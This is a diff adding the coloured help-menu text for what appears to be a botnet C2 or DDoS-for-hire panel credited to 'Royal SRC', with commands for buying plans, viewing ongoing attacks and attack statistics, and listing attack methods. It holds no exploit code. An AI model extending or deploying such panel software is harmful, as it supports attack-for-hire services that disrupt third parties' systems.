@@ -1,0 +1,27 @@
+<<clear()>>
+<<full_screen_custom(75x30)>>
+
+[38;5;255mCommands Overview[38;5;045m:[38;5;255m
+[38;5;45m├──[38;5;255m General Commands
+[38;5;45m│   ├── [97mCLEAR[0m        [38;5;045m:[38;5;255m Simple clear terminal.
+[38;5;45m│   ├── [97mEXIT[0m         [38;5;045m:[38;5;255m Close your connection.
+[38;5;45m│   ├── [97mChat[0m         [38;5;045m:[38;5;255m Acces To SSH CHAT.
+[38;5;45m│   ├── [97mShop[0m         [38;5;045m:[38;5;255m Buy a plan in a shop for <<$cnc>>.
+[38;5;45m│   ├── [97mInvest[0m       [38;5;045m:[38;5;255m View all cmd investisor for <<$cnc>>.
+[38;5;45m│   ├── [97mDog[0m          [38;5;045m:[38;5;255m add a dog. (if you send attack your dog send same)
+[38;5;45m│   ├── [97mHELP[0m         [38;5;045m:[38;5;255m Display this help page.
+[38;5;45m│   └── [97mCREDITS[0m      [38;5;045m:[38;5;255m View Royal SRC credits.
+[38;5;45m├── User Commands
+[38;5;45m│   ├── [97mMFA[0m          [38;5;045m:[38;5;255m Manage MFA for your account.
+[38;5;45m│   ├── [97mPASSWD[0m       [38;5;045m:[38;5;255m Change your password.
+[38;5;45m│   ├── [97mRECENT[0m       [38;5;045m:[38;5;255m View your recent logs.
+[38;5;45m│   ├── [97mONGOING[0m      [38;5;045m:[38;5;255m View ongoing attacks.
+[38;5;45m│   └── [97mONLINE[0m       [38;5;045m:[38;5;255m Display online users list.
+[38;5;45m├── Network Tools
+[38;5;45m│   ├── [97mC2 PAPING[0m    [38;5;045m:[38;5;255m Ping IP + Port.
+[38;5;45m│   ├── [97mLOOKUP[0m       [38;5;045m:[38;5;255m Perform CFX/IP lookups.
+[38;5;45m│   └── [97mC2[0m           [38;5;045m:[38;5;255m View OTHER COMMANDS.
+[38;5;45m└── Stats & Usage
+[38;5;45m    ├── [97mSTATS[0m        [38;5;045m:[38;5;255m View statistics.
+[38;5;45m    ├── [97mUSAGE[0m        [38;5;045m:[38;5;255m View attack statistics.
+[38;5;45m    └── [97mMETHODS[0m      [38;5;045m:[38;5;255m Display methods information.
